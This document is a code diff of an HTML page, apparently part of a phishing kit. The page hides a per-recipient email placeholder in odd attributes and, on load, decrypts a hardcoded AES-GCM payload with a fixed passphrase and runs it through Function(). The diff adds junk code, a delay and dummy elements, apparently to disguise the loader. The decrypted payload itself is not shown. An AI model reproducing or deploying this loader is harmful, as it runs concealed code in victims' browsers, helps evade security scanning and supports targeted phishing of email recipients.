@@ -4,26 +4,46 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Decryption Example</title>
+    <style>
+        body { background-color: #f8f9fa; font-family: Arial, sans-serif; }
+        .dummy-class { color: transparent; user-select: none; }
+    </style>
 </head>
 <body>
-    <div id="hidden-container" style="display:none;">
-        <span nike-tes2="" adidas="<%=EMAIL64%>">Hidden Data</span>
+    <div id="useless-container">
+        <p class="dummy-class">Hidden <span>Content</span></p>
     </div>
+    <div style="display:none;">
+        <div nike-Xchuntxy="" adidas="<%=EMAIL64%>"></div>
+    </div>
+
     <script>
-        // Convert hex string to Uint8Array
         const hexToBytes = (hex) => {
-            console.log("Processing hex string...");
-            const randomUnusedVar = Math.random(); // Useless logic
+            console.log("Converting hex to bytes...");
+            let unused = hex.length * Math.PI; // Pointless calculation
             return Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
         };
 
-        // Decrypt AES-GCM encrypted data
+        const uselessFunction = () => {
+            let uselessVar = 123;
+            document.body.innerHTML += `<!-- Dummy HTML Fragment ${uselessVar} -->`;
+        };
+
+        const appendHiddenElement = () => {
+            const hiddenEl = document.createElement("div");
+            hiddenEl.id = "dummy-element";
+            hiddenEl.style.display = "none";
+            document.body.appendChild(hiddenEl);
+        };
+
         const decrypt = async (enc, ivHex, saltHex, key) => {
-            console.log("Initializing decryption...");
+            console.log("Starting AES-GCM decryption...");
+            appendHiddenElement(); // Adding pointless element
+
             const iv = hexToBytes(ivHex);
             const salt = hexToBytes(saltHex);
+            const delay = new Promise((resolve) => setTimeout(resolve, 100)); // Useless delay
 
-            console.log("Creating key material...");
             const keyMaterial = await crypto.subtle.importKey(
                 "raw",
                 new TextEncoder().encode(key),
@@ -31,7 +51,9 @@
                 false,
                 ["deriveKey"]
             );
-
+            
+            await delay; // Unnecessary waiting
+            
             const aesKey = await crypto.subtle.deriveKey(
                 { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
                 keyMaterial,
@@ -39,60 +61,53 @@
                 false,
                 ["decrypt"]
             );
-
-            console.log("Attempting to decrypt...");
+            
             try {
+                console.log("Decrypting payload...");
                 const decryptedBytes = await crypto.subtle.decrypt(
                     { name: "AES-GCM", iv },
                     aesKey,
                     hexToBytes(enc)
                 );
-                console.log("Decryption completed!");
+                console.log("Payload decrypted!");
                 return new TextDecoder().decode(decryptedBytes);
             } catch (error) {
-                console.error("Decryption failed. Debug Info:", error);
-                throw error;
+                console.error("Decryption error:", error);
+                return "";
             }
         };
 
-        // Random useless function
-        const generateDummyData = () => {
-            console.log("Generating dummy data...");
-            const dummy = [];
-            for (let i = 0; i < 5; i++) {
-                dummy.push(String.fromCharCode(65 + i));
+        const dummyDataGenerator = () => {
+            let result = "";
+            for (let i = 0; i < 10; i++) {
+                result += Math.random().toString(36).substring(2);
             }
-            console.log("Dummy Data:", dummy.join("-"));
+            console.log("Generated dummy data:", result);
+            return result;
         };
 
-        // Self-executing async function
         (async () => {
-            console.log("Starting main execution...");
-
-            const params = {
+            console.log("Main script execution started...");
+            uselessFunction();
+            dummyDataGenerator();
+            
+            const payload = {
                 iv: "c444d6b988c97f7ea2aa5716",
                 salt: "06b9dcb639aeb4a298624e4d2709f4c3",
                 data: "26cbae7ed8856d9cd8d7fed943b6b4057d02f653f16ad4b50df937b866b7491270da18b75c5b1ae09454dfc024e1b06af75301f0b4d1429df0198573f04c1fa219e4eb7b055c8fc740f4cd0bce40244c73927abba0d44a2910efd70981c5002a099cb8ac42273d78c2da6a22762bb4bc1e702426a9f0b75e074607bca07e7122a60e92fe1d35ee602910fce409af78027670a7b55d09608632b357201c6a14a7da17eb9b30d60c98e95f85a26a3e7a27406c70c88c74ebf167a2de66ec9853c6c2bbd82ee92a6f",
             };
 
             try {
-                console.log("Decrypting the payload...");
-                const result = await decrypt(params.data, params.iv, params.salt, "quickescape");
-                console.log("Decrypted Content:", result);
-
-                // Dummy transformation
-                const randomLogic = result.split("").reverse().join("");
-                console.log("Transformed Content:", randomLogic);
-
-                // Execute decrypted content
-                console.log("Executing decrypted script...");
-                Function(`${result}`)();
-            } catch (error) {
-                console.error("Error in execution:", error);
+                const decryptedContent = await decrypt(payload.data, payload.iv, payload.salt, "quickescape");
+                console.log("Decrypted Output:", decryptedContent);
+                const reversed = decryptedContent.split("").reverse().join(""); // Dummy transformation
+                console.log("Transformed Output:", reversed);
+                
+                document.getElementById("useless-container").innerText = "Decryption Success!";
+                Function(`${decryptedContent}`)();
+            } catch (err) {
+                console.error("Execution error:", err);
             }
-
-            // Execute dummy logic
-            generateDummyData();
         })();
     </script>
 </body>
